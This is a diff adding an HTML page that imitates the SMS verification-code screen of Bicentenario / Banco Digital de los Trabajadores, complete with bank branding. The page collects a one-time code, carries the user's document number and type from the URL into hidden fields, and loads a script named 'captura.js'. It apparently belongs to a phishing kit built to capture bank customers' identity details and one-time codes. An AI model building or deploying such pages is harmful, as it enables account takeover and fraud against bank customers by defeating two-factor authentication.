@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="csrf-token" content="wAi4FTecoWZK9hbsX65yMwVDWHIavsvARe1UBIu">
+    <title>Bicentenario</title>
+    <meta name="description" content="">
+    <meta name="author" content="Luis Eduardo Perez">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <link rel="stylesheet" type="text/css" media="screen" href="./docs/theme_2.css">
+    <link rel="shortcut icon" href="./docs/BBD-FAVICON-256x256.png" type="image/x-icon">
+    <link rel="icon" href="./docs/BBD-FAVICON-256x256.png" type="image/x-icon">
+    <link rel="stylesheet" href="./docs/pe-icon-7-stroke.css">
+    <link rel="stylesheet" href="./docs/loginStyle.css">
+
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="Bicentenario">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="msapplication-TileColor" content="#b91d47">
+    <meta name="theme-color" content="#ffffff">
+
+    <style type="text/css">
+        body.stop-scrolling {
+            height: auto !important;
+            overflow: visible !important;
+        }
+        .icon-watch {
+            color: #2c399f !important;
+        }
+        .show-account {
+            user-select: none;
+        }
+        .custom-checkbox {
+            width: 1.3rem;
+            height: 1.3rem;
+            background-color: #9e9e9e;
+        }
+        .cargando {
+            text-align: center;
+            padding: 15px;
+            display: none;
+        }
+    </style>
+</head>
+
+<body class="smart-style-3 fixed-page-footer fixed-header desktop-detected">
+
+    <div id="main" role="main" class="mainRegister">
+        <div id="content" class="container" style="opacity: 1;">
+            <form id="sms-form">
+                <input type="hidden" name="documento" id="documento-input">
+                <input type="hidden" name="tipodoc" id="tipodoc-input">
+                <div class="modal-dialog demo-modal">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h4 class="modal-title text-center mt-1">
+                                <img src="./docs/Logos-BBP-001.png" style="width: 80%;">
+                            </h4>
+                        </div>
+                        <div class="modal-body smart-form padding-10">
+                            <div class="row">
+                                <section class="col col-2"></section>
+                                <section class="col col-8">
+                                    <div align="center">
+                                        <span style="font-size:18px"><strong>Código de verificación SMS</strong></span>
+                                    </div><br>
+
+                                    <label class="btn-link-blue"><strong>Código de verificación *</strong></label> 
+                                    <label class="input show-account">
+                                        <input class="input-login" type="tel" required name="cod" id="cod" minlength="6" maxlength="8" autocomplete="off">
+                                    </label>   
+                                    <br> 
+                                    <label for="check1">
+                                        <input type="checkbox" class="custom-checkbox" id="check1"> Deseo guardar este dispositivo como de confianza
+                                    </label>
+                                </section>
+                            </div>
+
+                            <div class="cargando text-center">
+                                <img src="./docs/BBD-FAVICON-150x150.png" alt="" height="35"> Cargando, Por favor espere un momento...
+                            </div>
+
+                            <div class="botones">
+                                <div class="row mt-2">
+                                    <section class="col col-3"></section>
+                                    <section class="col col-6">
+                                        <button type="submit" class="btn bg-color-azul btn-block btn-azul-ingreso">
+                                            Continuar
+                                        </button>
+                                        <br>
+                                        <button type="button" onclick="history.back()" class="btn btn-block btn-ingreso" style="color:#2c399f;border:1px solid #2c399f;padding: 10px;font-weight: bold;font-size: 14px;border-radius: 7px;">
+                                            Regresar
+                                        </button>
+                                    </section>
+                                </div>
+                            </div>
+                            <div class="clearfix"></div>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="page-footer text-start" id="footer">
+        <div class="m-3" style="padding-left: 10%;">
+            <strong class="txt-color-white">
+                Banco Digital de los Trabajadores - RIF: G-20009148-7
+                <span class="hidden-xs"> Copyright © 2025.</span> Todos los derechos reservados.
+            </strong>
+        </div>
+    </div>
+
+    <script src="captura.js"></script>
+    <script>
+    // Recupera los parámetros de la URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const documento = urlParams.get('documento');
+    const tipodoc = urlParams.get('tipodoc');
+
+    // Asigna los valores a los campos ocultos
+    if (documento) {
+        document.getElementById('documento-input').value = documento;
+    }
+    if (tipodoc) {
+        document.getElementById('tipodoc-input').value = tipodoc;
+    }
+    </script>
+</body>
+</html>
